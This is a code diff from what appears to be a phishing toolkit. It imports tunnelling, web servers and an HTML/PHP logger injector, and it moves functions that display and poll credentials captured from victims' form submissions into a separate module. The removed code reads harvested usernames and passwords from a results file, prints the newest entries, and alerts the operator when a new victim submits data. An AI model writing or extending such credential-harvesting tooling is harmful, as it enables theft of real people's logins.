@@ -10,6 +10,7 @@ from utils import (
 from flask_server import launch_flask_server
 from php import launch_php_server
 from tunnel import run_expose_and_get_url
+from printer import monitor_credentials
 
 sys.path.insert(0, os.path.join(SCARFACE_ROOT, "src", "services", "injector"))
 from inject import inject_logger_to_all_html, inject_logger_to_php
@@ -57,77 +58,6 @@ def expose_menu():
             print(f"{RED}[ERROR] Invalid option{RESET}")
         except ValueError:
             print(f"{RED}[ERROR] Enter a number{RESET}")
-
-def get_credential_count(site_name):
-    site_dir = os.path.join(CREDENTIALS_DIR, site_name)
-    credentials_file = os.path.join(site_dir, "result.json")
-    if not os.path.exists(credentials_file):
-        return 0
-    try:
-        with open(credentials_file, "r") as f:
-            data = json.load(f)
-            if isinstance(data, list):
-                return len(data)
-    except Exception:
-        pass
-    return 0
-
-def print_credentials(site_name):
-    site_dir = os.path.join(CREDENTIALS_DIR, site_name)
-    credentials_file = os.path.join(site_dir, "result.json")
-    if not os.path.exists(credentials_file):
-        return
-    with open(credentials_file, "r") as f:
-        try:
-            creds = json.load(f)
-        except json.JSONDecodeError:
-            return
-    if not creds:
-        return
-    print(f"\n{BOLD}{BLUE}Latest Captured Credentials:{RESET}")
-    for i, cred in enumerate(creds[-5:][::-1], 1):
-        print(f"\n{BLUE}{i}. Time: {cred.get('timestamp', 'N/A')}{RESET}")
-        data = cred.get('data', {}) or cred.get('form_data', {})
-        if not data and 'raw' in cred:
-            print(f"   {BLUE}raw:{RESET} {cred['raw']}")
-        else:
-            for key, value in data.items():
-                print(f"   {BLUE}{key}:{RESET} {value}")
-
-def monitor_credentials(site_name):
-    site_dir = os.path.join(CREDENTIALS_DIR, site_name)
-    credentials_file = os.path.join(site_dir, "result.json")
-    last_count = 0
-    if not os.path.exists(credentials_file):
-        os.makedirs(site_dir, exist_ok=True)
-        with open(credentials_file, 'w') as f:
-            json.dump([], f)
-    else:
-        try:
-            with open(credentials_file, 'r') as f:
-                last_count = len(json.load(f))
-        except json.JSONDecodeError:
-            last_count = 0
-    print(f"\n{BOLD}{BLUE}Waiting for credentials... (Ctrl+C to stop){RESET}")
-    try:
-        while True:
-            with open(credentials_file, 'r') as f:
-                try:
-                    current_count = len(json.load(f))
-                except json.JSONDecodeError:
-                    current_count = 0
-            if current_count > last_count:
-                print(f"\n{BOLD}{BLUE}NEW CREDENTIALS CAPTURED!{RESET}")
-                print_credentials(site_name)
-                last_count = current_count
-                try:
-                    import winsound
-                    winsound.Beep(1000, 300)
-                except:
-                    pass
-            time.sleep(1)
-    except KeyboardInterrupt:
-        pass
 
 def main():
     if not os.path.exists(CREDENTIALS_DIR):
